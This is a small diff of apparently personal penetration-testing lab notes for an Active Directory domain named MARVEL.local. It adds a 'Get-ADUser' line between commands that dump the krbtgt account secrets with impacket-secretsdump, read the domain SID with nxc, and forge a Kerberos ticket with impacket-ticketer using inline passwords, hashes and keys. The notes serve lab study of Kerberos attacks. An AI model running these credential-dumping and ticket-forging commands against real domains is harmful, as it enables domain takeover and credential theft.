@@ -179,6 +179,9 @@ q
 #collect prequest
 impacket-secretsdump MARVEL.local/hawkeye:@192.168.154.134 -just-dc-user krbtgt
 nxc ldap 192.168.154.134 -u fcastle -p Password@123 --get-sid
+Get-ADUser fcastle -Properties SID
+
+  
   
 #let's create ticket.
 impacket-ticketer -request -domain 'MARVEL.local' -user 'fcastle' -password 'Password@123' -nthash 'c90bf74688c024687385328ca2616f5b' -aesKey '9c8112d6397758b1c23debf624c5bb655ae10ed793d2f224bd878005ad451d78' -domain-sid 'S-1-5-21-3614020701-506922700-4184706594' fcastle
